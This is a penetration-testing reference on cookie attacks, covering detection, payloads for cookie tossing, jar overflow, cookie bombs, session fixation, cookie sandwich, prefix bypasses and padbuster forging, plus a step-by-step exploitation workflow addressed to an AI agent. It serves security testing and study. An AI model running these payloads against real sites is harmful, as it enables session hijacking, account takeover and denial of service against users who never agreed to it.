# Cookie-Based Attacks

> **Summary**: Exploitation of insecure cookie configurations, predictable session identifiers, and cookie handling inconsistencies to hijack sessions, fixate authentication, bypass security controls, or cause denial of service.
> **Impact**: Session hijacking, account takeover, CSRF bypass, authentication bypass, denial of service, and privilege escalation.
> **Typical Severity**: Medium | High

## Detection

### Indicators

- `Set-Cookie` headers missing security flags (`Secure`, `HttpOnly`, `SameSite`).
- Predictable or sequential session IDs.
- Sensitive data stored directly in cookies (usernames, roles, emails).
- Cookies that do not change after login (session fixation risk).
- Cookies that survive after logout (session invalidation failure).
- Cookies using weak or no encryption (Base64-encoded values, ECB mode).
- Missing `__Host-` or `__Secure-` prefixes on sensitive cookies.

### Automated Detection

```bash
# Inspect Set-Cookie headers
curl -s -I https://target.com/login | grep -i "set-cookie"

# Check for missing flags
curl -s -I https://target.com/login | grep -i "set-cookie" | grep -ivE "(secure|httponly|samesite)"
```

### Manual Detection

Examine every `Set-Cookie` header in Burp Suite or browser DevTools for:

1. **Secure flag**: Missing means cookie sent over HTTP (MITM risk).
2. **HttpOnly flag**: Missing means JavaScript can read it via `document.cookie` (XSS theft).
3. **SameSite attribute**: Missing or `None` means cross-site requests include the cookie (CSRF risk).
4. **Domain attribute**: Overly broad domain (e.g., `.example.com`) exposes cookie to all subdomains.
5. **Path attribute**: Overly broad path (`/`) when the cookie should be scoped.
6. **Expires/Max-Age**: Long-lived sessions increase the window for session hijacking.

## Exploitation

### Prerequisites

- Access to inspect HTTP responses (Burp Suite, browser DevTools, curl).
- For cookie tossing: control of a subdomain or XSS on a subdomain.
- For cookie theft: XSS vulnerability on the target domain (or MITM for non-Secure cookies).

### Step-by-Step

1. **Enumerate cookies**: Log in and catalog all cookies, their values, and attributes.
2. **Check for sensitive data**: Decode cookie values (Base64, hex, URL-encoded) and look for PII or role information.
3. **Test session fixation**: Set a known session cookie before login, log in, and check if the pre-set cookie is still valid.
4. **Test session invalidation**: Log out and replay the session cookie to check if it still works.
5. **Test cookie manipulation**: Modify decoded cookie values (change user ID, role, etc.) and observe if the app accepts them.
6. **Test cross-subdomain attacks**: If you control a subdomain, attempt cookie tossing.
7. **Test Padding Oracle**: If cookie appears encrypted with block cipher, use padbuster.

### Cookie Attribute Analysis

| Attribute | Secure Setting | Attack if Missing |
|---|---|---|
| `Secure` | Present | Cookie sent over HTTP, interceptable via MITM |
| `HttpOnly` | Present | Cookie readable by JavaScript (`document.cookie`), stealable via XSS |
| `SameSite=Strict` | Strict or Lax | `None` or absent allows cross-site request inclusion (CSRF) |
| `Domain` | Not set (defaults to exact host) | Broad domain exposes cookie to all subdomains (cookie tossing) |
| `Path` | Scoped to specific path | `/` allows cookie on all paths |
| `__Host-` prefix | Used for sensitive cookies | Without prefix, subdomains can overwrite the cookie |
| `Expires/Max-Age` | Short-lived | Long-lived cookies increase hijacking window |

### SameSite Behavior Table

| Request Type | SameSite=Strict | SameSite=Lax | SameSite=None |
|---|---|---|---|
| Top-level navigation (link click) | Not sent | Sent | Sent |
| Form GET | Not sent | Sent | Sent |
| Form POST | Not sent | Not sent | Sent |
| iframe | Not sent | Not sent | Sent |
| AJAX / fetch | Not sent | Not sent | Sent |
| Image / preload | Not sent | Not sent | Sent |

Note: Since Chrome 80 (Feb 2020), the default for cookies without an explicit `SameSite` attribute is `Lax`.

### Payloads

#### Cookie Tossing (Subdomain Attack)

When an attacker controls a subdomain (e.g., via XSS or subdomain takeover), they can set cookies scoped to the parent domain:

```javascript
// From attacker-controlled subdomain, set cookie for parent domain
document.cookie = "session=attacker_value; Path=/; Domain=.example.com";

// Session fixation via cookie tossing
document.cookie = "sessionid=known_value_to_attacker; Path=/app/login; Domain=.example.com";

// CSRF token override (e.g., Flask stores CSRF token in cookie)
document.cookie = "csrf_token=known_value; Path=/; Domain=.example.com";
```

#### Cookie Jar Overflow (Overwrite HttpOnly Cookies)

Browsers limit the number of cookies per domain. By setting many cookies, the oldest ones (including HttpOnly cookies) are evicted, then the attacker can set a replacement:

```javascript
// Overflow the cookie jar to evict legitimate cookies
for (let i = 0; i < 700; i++) {
    document.cookie = `cookie${i}=${i}; Secure`;
}

// Clean up overflow cookies
for (let i = 0; i < 700; i++) {
    document.cookie = `cookie${i}=${i}; expires=Thu, 01 Jan 1970 00:00:01 GMT`;
}

// Now set the replacement cookie with attacker-controlled value
document.cookie = "session=attacker_session; Path=/";
```

#### Cookie Bomb (Denial of Service)

Setting many large cookies causes the victim's requests to exceed server header size limits, resulting in 413 or 431 errors:

```javascript
// Set many large cookies to DoS the victim
for (let i = 0; i < 100; i++) {
    document.cookie = `bomb${i}=${"A".repeat(4000)}; Path=/; Domain=.example.com`;
}
// Victim's browser now sends oversized Cookie headers, server rejects with 413/431
```

#### Session Fixation

```javascript
// Attacker sets a known session ID before victim logs in
document.cookie = "PHPSESSID=attacker_known_session_id; Path=/";
// If the app does not regenerate the session after login, attacker can use this session ID
```

#### Cookie Decoding and Manipulation

```bash
# Decode Base64 cookie
echo "dXNlcj1hZG1pbiZyb2xlPXVzZXI=" | base64 -d
# Output: user=admin&role=user

# Modify and re-encode
echo -n "user=admin&role=admin" | base64
# Output: dXNlcj1hZG1pbiZyb2xlPWFkbWlu
```

#### Cookie Smuggling (RFC 2965 Parsing Abuse)

Some Java servers (Jetty, Tomcat, Undertow) and Python servers (Zope, cherrypy) mishandle double-quoted cookie values, treating semicolons inside quotes as part of the value:

```
RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```

The server reads this as a single cookie value including the embedded `JSESSIONID`.

#### Cookie Sandwich (Steal HttpOnly Cookies)

Exploits `$Version=1` legacy RFC 2109 parsing to trap HttpOnly cookies between attacker-controlled values:

```javascript
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// The legitimate HttpOnly cookie gets sandwiched here
document.cookie = `param2=end";`;
// Server-side, param1's value becomes: "start; <httponly_cookie_value>; end"
```

#### Unicode Whitespace Prefix Bypass

Bypass `__Host-` / `__Secure-` cookie prefix protections using Unicode whitespace that browsers allow but backends trim:

```javascript
// Browser does not consider this as __Host- prefixed, so allows setting from subdomain
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
// Backend (e.g., Django) trims leading Unicode whitespace and sees __Host-name
```

#### Padding Oracle Attack

```bash
# Decrypt an encrypted cookie using Padding Oracle
padbuster http://target.com/index.php <COOKIE_VALUE> 8 -cookies auth=<COOKIE_VALUE>

# Forge a cookie with custom plaintext
padbuster http://target.com/index.php <COOKIE_VALUE> 8 -cookies auth=<COOKIE_VALUE> -plaintext user=administrator
```

### Proof of Concept

```bash
# Check if session cookie persists after logout
# 1. Log in and capture the session cookie
SESSION=$(curl -s -c - https://target.com/login -d "user=test&pass=test" | grep session | awk '{print $NF}')

# 2. Log out
curl -s -b "session=$SESSION" https://target.com/logout

# 3. Try to access authenticated page with old cookie
curl -s -b "session=$SESSION" https://target.com/dashboard
# If this returns the dashboard, session invalidation is broken

# Check if session changes after login (session fixation test)
# 1. Get a pre-auth session
PRE=$(curl -s -c - https://target.com/ | grep session | awk '{print $NF}')

# 2. Log in with that session
POST=$(curl -s -c - -b "session=$PRE" https://target.com/login -d "user=test&pass=test" | grep session | awk '{print $NF}')

# 3. Compare
echo "Pre-auth: $PRE"
echo "Post-auth: $POST"
# If identical, session fixation is possible
```

## Bypasses

- **HttpOnly bypass**: If the page reflects cookies in the HTML response (e.g., PHPinfo page), use XSS to fetch that page and extract cookie values from the response body.
- **HttpOnly bypass**: Use TRACE method (Cross-Site Tracing) if the server supports it -- the response echoes the full request including cookies.
- **HttpOnly bypass**: Cookie Jar Overflow to evict the HttpOnly cookie, then set a replacement.
- **HttpOnly bypass**: Cookie Sandwich technique using `$Version=1` to trap HttpOnly cookies in reflected parameters.
- **__Host- prefix bypass**: Unicode whitespace prepended to cookie name passes browser checks but gets trimmed by backend frameworks (Django, etc.).
- **__Host- prefix bypass**: Legacy `$Version=1` cookie splitting on Java backends (Tomcat, Jetty).
- **SameSite bypass**: If `SameSite=Lax`, top-level GET navigations still send the cookie. Use a form with `method=GET` or a window.open redirect.
- **Secure flag bypass**: Cookie tossing from a subdomain over HTTP can set cookies that override Secure cookies if the `__Host-` prefix is not used.

## Escalation

- **XSS to cookie theft**: Chain with [XSS](xss.md) to steal session cookies via `document.cookie` when HttpOnly is missing.
- **CSRF via SameSite bypass**: When `SameSite` is `None` or default, chain with [CSRF](csrf.md) to perform actions as the victim.
- **Cookie tossing to OAuth hijack**: Set a malicious state or nonce cookie from a subdomain to hijack OAuth flows.
- **Session fixation to account takeover**: Fixate a session, wait for victim to authenticate, then use the known session.
- **Insecure deserialization**: If cookies hold serialized objects, test for insecure deserialization.
- **CRLF injection**: Chain CRLF injection to inject `Set-Cookie` headers and set arbitrary cookies.

## Basic Checks Checklist

- [ ] Cookie is the same every time you log in
- [ ] Session cookie works after logout
- [ ] Two devices/browsers can use the same session simultaneously
- [ ] Cookie contains readable/decodable information
- [ ] "Remember me" cookie is separate and testable
- [ ] Old cookie works after password change
- [ ] Session ID is sufficiently random (not sequential/predictable)
- [ ] Sensitive data is not stored in cookies (check decoded values)

## Tools

| Tool | Usage |
|---|---|
| [EditThisCookie](https://www.editthiscookie.com/) | Browser extension for viewing/editing cookies |
| [Cookie-Editor](https://cookie-editor.cgagnier.ca/) | Browser extension for cookie management (Chrome, Firefox) |
| [Burp Suite](https://portswigger.net) | Intercept and modify cookies in proxy, use Repeater for testing |
| [padbuster](https://github.com/AonCyberLabs/PadBuster) | `padbuster <URL> <COOKIE> <BLOCK_SIZE> -cookies auth=<COOKIE>` |
| [jwt_tool](https://github.com/ticarpi/jwt_tool) | For JWT-based cookies: `jwt_tool <TOKEN> -T` |
| [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) | `flask-unsign --decode --cookie <COOKIE>` / `--unsign --wordlist` |
| [cookie-monster](https://github.com/DigitalInterruption/cookie-monster) | Automated cookie security analysis |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for cookie-based vulnerabilities.

### Phase 1: Discovery
1. Log in to `<TARGET>` and catalog every cookie set by the application:
   ```bash
   curl -sI https://<TARGET>/login -d "user=<USER>&pass=<PASS>" | grep -i "set-cookie"
   ```
2. For each cookie, document:
   - **Name** and **Value** (decode Base64, hex, URL-encoded values)
   - **Secure** flag: present or missing
   - **HttpOnly** flag: present or missing
   - **SameSite** attribute: `Strict`, `Lax`, `None`, or absent
   - **Domain** attribute: exact host or broad (`.example.com`)
   - **Path** attribute: scoped or broad (`/`)
   - **Expires/Max-Age**: session or persistent (note duration)
   - **`__Host-`** or **`__Secure-`** prefix: present or missing
3. Check if cookies contain readable/decodable sensitive data (user IDs, roles, emails, serialized objects)
4. Test if session cookie changes after login (compare pre-auth and post-auth cookies for session fixation risk)
5. Test if session cookie is invalidated after logout (replay old cookie to authenticated endpoint)

### Phase 2: Validation
1. **Missing flags assessment**: For each cookie with missing security attributes, assess exploitability:
   - Missing `Secure` → interceptable via MITM on HTTP
   - Missing `HttpOnly` → stealable via XSS (`document.cookie`)
   - `SameSite=None` or absent → cross-site request inclusion (CSRF)
   - Broad `Domain` → exposed to all subdomains (cookie tossing risk)
2. **Session predictability**: Collect 10+ session IDs and analyze for patterns (sequential, timestamp-based, low entropy) using Burp Sequencer
3. **Cookie tossing feasibility**: Check if you control any subdomain of `<TARGET_DOMAIN>` (via XSS or subdomain takeover)
4. **Padding oracle test**: If cookie appears encrypted with a block cipher, test with padbuster:
   ```bash
   padbuster https://<TARGET>/ <COOKIE_VALUE> <BLOCK_SIZE> -cookies auth=<COOKIE_VALUE>
   ```

### Phase 3: Exploitation
1. **Cookie tossing** (if subdomain controlled): From the controlled subdomain, set cookies scoped to the parent domain:
   ```javascript
   document.cookie = "session=<ATTACKER_VALUE>; Path=/; Domain=.<TARGET_DOMAIN>";
   ```
2. **Session fixation**: Set a known session ID before the victim logs in, wait for authentication, then use the pre-set session:
   ```javascript
   document.cookie = "PHPSESSID=<KNOWN_SESSION_ID>; Path=/";
   ```
3. **Cookie jar overflow**: Evict legitimate HttpOnly cookies by setting 700+ cookies from JavaScript, then replace with attacker-controlled values:
   ```javascript
   for (let i = 0; i < 700; i++) { document.cookie = `c${i}=${i}; Secure`; }
   for (let i = 0; i < 700; i++) { document.cookie = `c${i}=${i}; expires=Thu, 01 Jan 1970`; }
   document.cookie = "session=<ATTACKER_SESSION>; Path=/";
   ```
4. **Cookie bomb (DoS)**: Set many large cookies to cause 413/431 errors for the victim:
   ```javascript
   for (let i = 0; i < 100; i++) { document.cookie = `bomb${i}=${"A".repeat(4000)}; Domain=.<TARGET_DOMAIN>`; }
   ```
5. **Padding oracle**: Decrypt and forge cookie values:
   ```bash
   padbuster https://<TARGET>/ <COOKIE_VALUE> 8 -cookies auth=<COOKIE_VALUE> -plaintext user=administrator
   ```

### Phase 4: Escalation
1. Chain with [XSS](xss.md): steal session cookies via `document.cookie` when HttpOnly is missing
2. Chain with [CSRF](csrf.md): exploit `SameSite=None` or absent attribute to perform authenticated cross-site actions
3. Chain cookie tossing with OAuth hijacking: overwrite `state` or `nonce` cookies from a subdomain to hijack OAuth flows
4. Chain session fixation with social engineering: fixate session, deliver link to victim, hijack authenticated session
5. Chain insecure deserialization: if cookies hold serialized objects (Java, PHP, .NET), test for RCE via deserialization payloads

## Decision Tree

```
Cookie Analysis
├── Missing HttpOnly?
│   └── XSS on target? → Steal cookie via document.cookie
├── Missing Secure flag?
│   └── HTTP available? → MITM interception
├── SameSite=None or absent?
│   └── CSRF possible → Cross-site authenticated requests
├── Predictable session ID?
│   └── Analyze with Sequencer → Predict/forge session tokens
├── Broad Domain attribute?
│   └── Control a subdomain? → Cookie tossing attack
│       ├── Session fixation via tossed cookie
│       ├── CSRF token override
│       └── OAuth state/nonce hijack
├── Cookie jar overflow feasible?
│   └── XSS on any subdomain → Evict HttpOnly cookies and replace
├── Encrypted cookie (block cipher)?
│   └── Padding oracle → Decrypt and forge values
├── Session survives logout?
│   └── Session invalidation broken → Replay attack
└── Session same before/after login?
    └── Session fixation → Pre-set session, wait for auth
```

## Success Criteria
- [ ] Hijacked another user's session by replaying or stealing their session cookie
- [ ] Session fixation confirmed: pre-set cookie remains valid after victim authenticates
- [ ] Cookie tossing from subdomain overwrote a legitimate session or CSRF token
- [ ] Padding oracle decrypted/forged a cookie value to escalate privileges (e.g., `user=administrator`)
- [ ] Authentication bypassed via cookie manipulation (decoded, modified, and re-encoded cookie accepted)

## References

- [HackTricks - Cookies Hacking](https://book.hacktricks.wiki/en/pentesting-web/hacking-with-cookies/)
- [HackTricks - Cookie Tossing](https://book.hacktricks.wiki/en/pentesting-web/hacking-with-cookies/cookie-tossing.html)
- [HackTricks - Cookie Bomb](https://book.hacktricks.wiki/en/pentesting-web/hacking-with-cookies/cookie-bomb.html)
- [HackTricks - Cookie Jar Overflow](https://book.hacktricks.wiki/en/pentesting-web/hacking-with-cookies/cookie-jar-overflow.html)
- [Cookie Bugs - ankursundara](https://blog.ankursundara.com/cookie-bugs/)
- [Cookie Crumbles: Unveiling Web Session Integrity Vulnerabilities (USENIX)](https://www.youtube.com/watch?v=F_wAzF4a7Xg)
- [PortSwigger - Bypassing WAFs with the Phantom $Version Cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
- [PortSwigger - Cookie Sandwich Technique](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique)
- [Cookie Chaos - Host and Secure Prefix Bypass](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [Overwriting HttpOnly Cookies via Cookie Jar Overflow](https://www.sjoerdlangkemper.nl/2020/05/27/overwriting-httponly-cookies-from-javascript-using-cookie-jar-overflow/)
